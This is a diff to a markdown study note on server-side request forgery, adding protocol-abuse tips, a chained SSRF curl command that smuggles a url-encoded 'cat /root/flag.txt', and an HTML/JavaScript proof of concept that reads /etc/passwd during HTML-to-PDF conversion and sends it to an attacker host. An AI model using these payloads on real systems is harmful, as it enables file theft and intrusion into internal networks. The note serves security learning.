@@ -29,6 +29,9 @@ Main point of intrests:
 >stockApi=http://localhost/admin
 >```
 
+Depending on the library used to issue the requests (eg. python [urllib](https://docs.python.org/3.8/library/urllib.html)), also other protocols may be supported and mis-used:
+- `file://`
+- `ftp://`
 ## SSRF attacks against other servers
 
 SSRF against other servers often arises when the application server is able to interact with other back-end systems that are not directly reachable by users. 
@@ -47,16 +50,20 @@ Connection: close
 >stockApi=http://192.168.0.100:8080/admin/delete?username=carlos&storeId=1
 >```
 
+>[!tip] Chain multiple SSRF!
+>Remember that you can chain multiple SSRF in order to increase the attack surface! However, **you must url-encode parameters and special characters one time for every component you are going trough**:
+>
+>Eg with 3 nodes: `curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=cat%252520%25252Froot%25252Fflag%25252Etxt"` (`cat /root/flag.txt` has been url-encoded 3 times)
 ## Blind SSRF
 
 Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.
 
-Blind SSRF can be found using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques.
+Blind SSRF can be found using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques and sometimes also looking at response times.
 
 >[!note]
 >It is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied Collaborator domain, but no subsequent HTTP request. This typically happens because the application attempted to make an HTTP request to the domain, which caused the initial DNS lookup, but the actual HTTP request was blocked by network-level filtering. It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations.
 
-Identifying a blind SSRF vulnerability that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. However, it can still be leveraged to probe for other vulnerabilities on the server itself or on other back-end systems. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server.
+Identifying a blind SSRF vulnerability that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. However, it can still be leveraged to probe for other vulnerabilities. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server.
 
 Another avenue for exploiting blind SSRF vulnerabilities is to induce the application to connect to a system under the attacker's control, and return malicious responses to the HTTP client that makes the connection. If you can exploit a serious client-side vulnerability in the server's HTTP implementation, you might be able to achieve remote code execution within the application infrastructure. [^1]
 
@@ -76,9 +83,36 @@ Connection: close
 ## Other attack surface
 
 - Partial URLs in requests (eg. only a hostname or part of a URL path into request parameters)
-- URLs within data formats (eg. XML leading to SSRF using [XML External Entity Injection (XXE Injection)](XML%20External%20Entity%20Injection%20(XXE%20Injection).md))
+- URLs within data formats
+	- XML leading to SSRF using [XML External Entity Injection (XXE Injection)](XML%20External%20Entity%20Injection%20(XXE%20Injection).md), 
+	- File converters or parsers and HTML files containing images (eg. wkhtmltopdf [^html2pdf] ) 
 - Referer header or other headers ([Host header SSRF attacks (aka Routing-based SSRF)](Host%20Header%20attacks.md#Host%20header%20SSRF%20attacks%20(aka%20Routing-based%20SSRF)))
 - [SSRF registering an arbitrary OpenID Connect client application](OpenID%20Connect%20attacks.md#SSRF%20registering%20an%20arbitrary%20client%20application)
+
+[^html2pdf]: [wkhtmltopdf](https://wkhtmltopdf.org/downloads.html), wkhtmltopdf.org
+
+PoC for leaking arbitrary files when converting HTML to PDF:
+```html
+<html>
+    <body>
+        <b>Exfiltration via Blind SSRF</b>
+        <script>
+        var readfile = new XMLHttpRequest(); // Read the local file
+        var exfil = new XMLHttpRequest(); // Send the file to our server
+        readfile.open("GET","file:///etc/passwd", true); 
+        readfile.send();
+        readfile.onload = function() {
+            if (readfile.readyState === 4) {
+                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
+                exfil.open("GET", url, true);
+                exfil.send();
+            }
+        }
+        readfile.onerror = function(){document.write('<a>Oops!</a>');}
+        </script>
+     </body>
+</html>
+```
 
 ## SSRF evasion and bypasses
 
